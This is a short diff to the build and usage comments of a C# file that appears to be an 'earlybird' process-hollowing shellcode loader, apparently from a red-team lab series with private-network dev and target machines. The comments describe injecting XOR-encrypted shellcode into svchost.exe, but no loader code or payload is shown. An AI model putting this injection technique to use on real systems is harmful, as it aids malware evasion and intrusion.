@@ -40,10 +40,14 @@
 //   - Document: 05_shellcode_loader.md (process injection section)
 //
 // BUILD INSTRUCTIONS:
-//   csc /unsafe /out:earlybird.exe 06_process_hollowing_alt.cs
+//   On Dev Box (ammulu, 192.168.10.150):
+//     csc /unsafe /out:earlybird.exe 06_process_hollowing_alt.cs
 //
 // USAGE:
-//   earlybird.exe <legitimate_exe_path> <shellcode.bin> [xor_key_hex]
+//   1. Compile on Dev Box (ammulu).
+//   2. Transfer earlybird.exe and encrypted shellcode to Target (kimjongun, 192.168.10.100).
+//   3. Run on Target:
+//        earlybird.exe <legitimate_exe_path> <shellcode.bin> [xor_key_hex]
 //
 //   Example:
 //     earlybird.exe C:\Windows\System32\svchost.exe encrypted.bin 4A7F2B...
